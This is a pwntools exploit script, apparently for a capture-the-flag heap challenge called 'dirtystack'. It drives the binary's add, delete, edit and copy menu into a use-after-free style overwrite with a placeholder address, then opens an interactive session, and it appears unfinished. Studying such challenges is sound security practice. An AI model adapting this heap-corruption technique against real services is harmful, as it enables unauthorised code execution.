#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('dirtystack_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def addItem(idx, item):
    io.sendlineafter(b">", b"1 0")
    io.sendlineafter(b":", str(idx).encode())
    io.sendline(item)

def deleteItem(idx):
    io.sendlineafter(b">", b"2 0")
    io.sendlineafter(b":", str(idx).encode())

def printItem():
    io.sendlineafter(b">", b"3 0")

def editItem(item):
    io.sendlineafter(b">", b"4 0")
    io.sendline(item)

def copyItem(idx):
    io.sendlineafter(b">", b"5 0")
    io.sendlineafter(b":", str(idx).encode())

    
def solve():

    addItem(0, b"A"*8)
    copyItem(1)
    copyItem(2)

    deleteItem(2)
    deleteItem(0)
    editItem(p64(0xdeadbeef))

    addItem(3, b"junk")
    # addItem(4, b"A"*8)
    
    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

